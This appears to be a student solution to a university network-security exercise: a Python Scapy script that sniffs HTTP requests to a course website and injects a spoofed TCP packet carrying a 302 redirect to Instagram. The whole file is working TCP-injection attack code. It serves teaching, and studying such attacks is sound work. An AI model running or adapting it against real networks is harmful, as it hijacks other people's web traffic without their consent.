import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    if 'Host: '+WEBSITE not in str(packet) or not packet.haslayer(S.IP):
        return None
    dst_port    = packet[S.TCP].dport
    src_port    = packet[S.TCP].sport
    src_ip      = packet[S.IP].src
    dst_ip      = packet[S.IP].dst
    ack_number  = packet[S.TCP].seq + len(packet[S.TCP].payload)
    seq_number  = packet[S.TCP].ack
    s = S.IP(src=dst_ip, dst=src_ip) / S.TCP(sport=dst_port, dport=src_port, flags='FA', ack=ack_number, seq=seq_number) / S.Raw(load=RESPONSE)
    return s

def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
